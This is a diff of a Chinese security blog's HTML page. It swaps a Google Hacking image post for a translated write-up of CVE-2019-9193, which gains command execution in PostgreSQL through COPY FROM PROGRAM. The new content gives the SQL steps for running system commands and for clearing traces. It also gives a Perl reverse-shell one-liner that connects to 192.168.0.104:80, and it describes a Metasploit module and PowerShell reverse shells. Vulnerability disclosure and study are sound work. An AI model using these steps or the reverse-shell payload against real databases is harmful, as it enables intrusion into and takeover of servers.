@@ -10,7 +10,7 @@
 		
 
 <head><meta name="generator" content="Hexo 3.8.0">
-	<title>Google Hacking</title>
+	<title>PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)</title>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="apple-mobile-web-app-title" content="Amaze UI">
@@ -55,7 +55,7 @@
 		
 		
 			
-			<p class="page-name">当前文章&nbsp;:&nbsp;《Google Hacking》</p>
+			<p class="page-name">当前文章&nbsp;:&nbsp;《PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)》</p>
 			
 		
 	
@@ -161,8 +161,8 @@
 					
 					
 	
-		<a href="/2019/03/21/Google Hacking/" itemprop="url">		
-			Google Hacking		
+		<a href="/2019/03/22/PostgreSQL 9.3上经过身份验证的任意命令执行/" itemprop="url">		
+			PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)		
 		</a>
 	
 
@@ -171,9 +171,9 @@
 				<p class="am-article-meta blog-text-center">
 					<span>
 						<i class="fa fa-clock-o"></i> 
-						<a href="/2019/03/21/Google Hacking/" itemprop="url">
-	<time datetime="2019-03-21T02:57:01.975Z" itemprop="datePublished">
-  		2019-03-21
+						<a href="/2019/03/22/PostgreSQL 9.3上经过身份验证的任意命令执行/" itemprop="url">
+	<time datetime="2019-03-22T10:00:49.202Z" itemprop="datePublished">
+  		2019-03-22
   </time>
 </a>    
 &nbsp;
@@ -188,43 +188,58 @@
 			<div class="am-article-bd">
 				<div class="content" id="post-content">
 					
-						<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>前言：</p>
-<p>Google搜索引擎是十分强大的，就拿自己的网站site:bywalks.com搜索一下，百度只能找到两个页面，而谷歌则除了robot.txt不允许的之外都可以搜索到。</p>
-<p>这篇文章就是Google Hacking的语句。来自于偶然遇到的一个国外博客，觉得挺不错的，所以分享给大家，文后会附上地址的。自己看图，不多说。</p>
-<p>开始：</p>
-<p><img src="https://i.imgur.com/VKNfeNR.png" alt=""></p>
-<p><img src="https://i.imgur.com/2OqqcWD.png" alt=""></p>
-<p><img src="https://i.imgur.com/wz0yTpW.png" alt=""></p>
-<p><img src="https://i.imgur.com/2VK5uKd.png" alt=""></p>
-<p><img src="https://i.imgur.com/6Gr7NDI.png" alt=""></p>
-<p><img src="https://i.imgur.com/ptyrCZA.png" alt=""></p>
-<p><img src="https://i.imgur.com/DDbzfWJ.png" alt=""></p>
-<p><img src="https://i.imgur.com/7z2Tegh.png" alt=""></p>
-<p><img src="https://i.imgur.com/sbX4niQ.png" alt=""></p>
-<p><img src="https://i.imgur.com/kJv6kTB.png" alt=""></p>
-<p><img src="https://i.imgur.com/el9KFdr.png" alt=""></p>
-<p><img src="https://i.imgur.com/dl3Mdqh.png" alt=""></p>
-<p><img src="https://i.imgur.com/WEmz2Qr.png" alt=""></p>
-<p><img src="https://i.imgur.com/Pyj0aTk.png" alt=""></p>
-<p><img src="https://i.imgur.com/ta4kLqS.png" alt=""></p>
-<p><img src="https://i.imgur.com/W2Jt0wU.png" alt=""></p>
-<p><img src="https://i.imgur.com/TmckwGM.png" alt=""></p>
-<p><img src="https://i.imgur.com/mdCYAWZ.png" alt=""></p>
-<p><img src="https://i.imgur.com/Uz9xFey.png" alt=""></p>
-<p><img src="https://i.imgur.com/3hVoDnj.png" alt=""></p>
-<p><img src="https://i.imgur.com/lzRPGGh.png" alt=""></p>
-<p><img src="https://i.imgur.com/dkXdwxh.png" alt=""></p>
-<p><img src="https://i.imgur.com/Mxjs6Uv.png" alt=""></p>
-<p><img src="https://i.imgur.com/GvZFN2H.png" alt=""></p>
-<p><img src="https://i.imgur.com/xvHHVUJ.png" alt=""></p>
-<p><img src="https://i.imgur.com/tHZRFOK.png" alt=""></p>
-<p><img src="https://i.imgur.com/biFf14f.png" alt=""></p>
-<p><img src="https://i.imgur.com/9lp7CJ2.png" alt=""></p>
-<p><img src="https://i.imgur.com/wvtOlLv.png" alt=""></p>
-<p><img src="https://i.imgur.com/FKPEqqD.png" alt=""></p>
-<p><img src="https://i.imgur.com/cvUorHS.png" alt=""></p>
-<p><img src="https://i.imgur.com/3108ej4.png" alt=""></p>
-<p><img src="https://i.imgur.com/m7h4r4T.png" alt=""></p>
+						<h2 id="PostgreSQL-9-3上经过身份验证的任意命令执行漏洞-CVE-2019-9193"><a href="#PostgreSQL-9-3上经过身份验证的任意命令执行漏洞-CVE-2019-9193" class="headerlink" title="PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)"></a>PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)</h2><p>原文链接：<a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5" target="_blank" rel="noopener">https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5</a></p>
+<p><img src="https://i.imgur.com/N6KNv2x.jpg" alt=""></p>
+<p>PostgreSQL，俗称Postgres，是世界上最大，最受欢迎的数据库系统之一。它是Mac OSX的主要数据库，同时也有Linux和Windows版本。</p>
+<p>今天，我将讨论一个漏洞（CVE-2019-9193），它能使某些数据库用户利用Postgres实现任意代码执行。</p>
+<p>这个漏洞几乎影响了PostgreSQL的所有版本（从9.3到最新的11.2），同时也影响了所有的操作系统：<strong>Windows，Linux和Mac。</strong></p>
+<p>从版本9.3开始，Postgres新增了一个<a href="https://paquier.xyz/postgresql-2/postgres-9-3-feature-highlight-copy-tofrom-program/" target="_blank" rel="noopener">“COPY TO/FROM PROGRAM”</a>功能。这个功能简单来说就是允许数据库的超级用户</p>
+<p>以及<code>pg_read_server_files</code>组中的任何用户执行操作系统命令。这就意味着数据库的超级用户与运行数据库的用户在操作系统上拥有相同的权限。</p>
+<p><img src="https://i.imgur.com/3Ji3QH5.png" alt=""></p>
+<p>这种缺乏权限分离的设定，我们早在2000年左右就能看到，例如，<code>Microsoft SQL Server</code>中看到，在默认情况下启用了xp_cmdshell功能。</p>
+<p>直到<code>Microsoft SQL Server 2005</code>中对此进行了修补和禁用，但有趣的是，相同的错误一直在不断重复的。</p>
+<p><img src="https://i.imgur.com/CrEpKUN.png" alt=""></p>
+<p>这种错误/缺陷/功能/漏洞介于提权和任意代码执行之间，因为在利用它之前需要数据库的某种身份验证。当然，攻击者也有可能通过SQL注入来实现。无论哪种情况，只有超级用户或具有“pg_read_server_files”权限的用户都才能执行系统命令。</p>
+<p>要执行攻击，只需按照以下步骤操作：</p>
+<blockquote>
+<p>1）[可选]删除要使用的表（如果已存在）</p>
+<p><code>DROP TABLE IF EXISTS cmd_exec</code>;</p>
+<p>2）创建要保存命令输出的表</p>
+<p><code>CREATE TABLE cmd_exec（cmd_output text）</code>;</p>
+<p>3）通过<code>COPY FROM PROGRAM</code>功能运行系统命令</p>
+<p><code>COPY cmd_exec FROM PROGRAM&#39;id&#39;</code>;</p>
+<p>4）[可选]查看结果</p>
+<p><code>SELECT * FROM cmd_exec</code>;</p>
+<p>5）[可选]清理痕迹</p>
+<p><code>DROP TABLE IF EXISTS cmd_exec</code>;</p>
+</blockquote>
+<p><img src="https://i.imgur.com/1QmOBQg.png" alt=""></p>
+<p>请注意，在原本命令中的任何单引号必须是双引号才能转义它们，因此例如，如果要运行：</p>
+<p><code>echo&#39;hello&#39;</code>;</p>
+<p>你需要将它放在单引号内，然后用双引号替换所有单引号：</p>
+<pre><code>&#39;echo&#39;&#39;hello&#39;&#39;;&#39;
+</code></pre><p>我已在Postgres可运行的所有操作系统上进行了测试，都以反弹回一个shell为目标，这个shell的权限如下：</p>
+<blockquote>
+<ol>
+<li>Windows - NT AUTHORITY / NETWORK SERVICE（低私有）</li>
+<li>Linux - postgres（低私有）</li>
+<li>Mac - 安装postgres的用户（通常是管理员）</li>
+</ol>
+</blockquote>
+<p>Linux和Mac OSX通常可以通过perl one liner使用，其命令如下：</p>
+<blockquote>
+<p>COPY files FROM PROGRAM’perl -MIO -e’’$ p = fork; exit，if（$ p）; $ c = new IO :: Socket :: INET（PeerAddr，“192.168.0.104:80”）; STDIN- fdopen（$ c，r）; $〜 - fdopen（$ c，w）; system $ _ while &lt;&gt;;’’’;</p>
+</blockquote>
+<p>当然，我还有更简单的方法。我制作了一个新的<a href="https://github.com/Greenwolf/postgres_cmd_execution_nine_three" target="_blank" rel="noopener">Metasploit模块</a>（应尽快合并到主框架中）来简化开发过程，因为原本的<code>postgres_payload</code>模块只能在版本8之前工作</p>
+<p><code>postgres_cmd_execution_nine_three.rb</code>会自动执行上述所有操作，如果你提供的话它具有有效的数据库凭据，具有正确的权限。对于SQL注入，您必须采用手动进行操作。</p>
+<p><img src="https://i.imgur.com/sXCGdm9.png" alt=""></p>
+<p><img src="https://i.imgur.com/DsZNciv.png" alt=""></p>
+<p>但是对于Windows，<code>NETWORK SERVICE</code>用户似乎没有任何写权限，但仍然可以使用PowerShell来反弹shell。</p>
+<p>我们可以使用me tasploit来生成Powershell编写的反弹shell语句，再带入上述模块中的COMMAND变量。请注意，要使用反斜杠来转义单引号。</p>
+<p><img src="https://i.imgur.com/VNA2SIC.png" alt=""></p>
+<p><img src="https://i.imgur.com/fKwe2bZ.png" alt=""></p>
+<p><img src="https://i.imgur.com/DcfUYzu.png" alt=""></p>
+<p>我希望你发现这项新技术对你很有帮助。</p>
 
 					
 				</div>
@@ -233,15 +248,9 @@
 
 		<ul class="am-pagination">
     
-    	<li class="am-pagination-prev">
-   		<a class="pull-left" href="/2019/03/22/PostgreSQL 9.3上经过身份验证的任意命令执行/" title="PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)">
-      		&laquo; 上一篇
-		</a>
-		</li>
-	
 	
 		<li class="am-pagination-next">
-		<a class="pull-right" href="/2019/03/21/Pragyan CTF 19 WEB writeups/" title="Pragyan CTF 19 WEB writeups">
+		<a class="pull-right" href="/2019/03/21/Google Hacking/" title="Google Hacking">
 			下一篇 &raquo;
 		</a>
 		</li>
@@ -370,7 +379,7 @@
 				
 				
 				<!--toc(post.content)-->
-				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Google-Hacking"><span class="post-toc-text">Google Hacking</span></a></li></ol>
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PostgreSQL-9-3上经过身份验证的任意命令执行漏洞-CVE-2019-9193"><span class="post-toc-text">PostgreSQL 9.3上经过身份验证的任意命令执行漏洞 (CVE-2019-9193)</span></a></li></ol>
 			</nav>
 			<div class="post-toc-bar"><div>
 		</div></div></aside>
